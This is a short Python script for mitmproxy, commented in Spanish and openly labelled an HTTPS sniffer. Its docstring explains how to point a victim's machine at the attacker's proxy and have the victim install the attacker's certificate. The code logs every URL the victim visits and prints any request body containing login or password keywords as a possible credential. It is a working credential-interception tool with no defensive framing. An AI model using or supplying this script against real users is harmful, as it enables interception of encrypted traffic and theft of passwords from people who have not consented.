# /usr/bin/env python3
"""
HTTPS sniffer - MITM Proxy

1. Descargar los binarios de mitmproxy, mitmweb y mitmdump
2. Ejecutar binario mitmweb o mitmproxy.
3. Configurar el proxy en la máquina víctima. (IP:8080)
4. Comprobar en la url mitm.it desde la máquina de la victima que
ya puedes descargar el certificado
5. Instalar el certificado en la máquina de la víctima
6. Observar el tráfico en la máquina del atacante
7. Ejecutar el script con el binario mitmdump con la opción -s para
indicar el script a ejecutar y personalizar la recogida de información

También se puede lanzar desde docker: https://hub.docker.com/r/mitmproxy/mitmproxy/

"""

from mitmproxy import http
from urllib.parse import urlparse


def has_keywords(data, keywords):
    """
    Esta función comprueba si en la petición se encuentran las palabras
    clave que nos interesan
    """

    return any(keyword in data for keyword in keywords)



def request(packet):
    """
    Esta función se ejecuta cada vez que se realiza una petición
    """

    url = packet.request.url

    parsed_url = urlparse(url)

    scheme = parsed_url.scheme

    domain = parsed_url.netloc

    path = parsed_url.path

    print(f"\n\nURL visitada por la víctima: {scheme}://{domain}{path}")

    keywords = [
        "login", "signin", "logon", 
        "password", "pass", "passwd",
        "user", "username"
    ]

    data = packet.request.get_text()

    if has_keywords(data, keywords):

        print(f"\n\nPosible credencial:\n\n{data}\n\n")
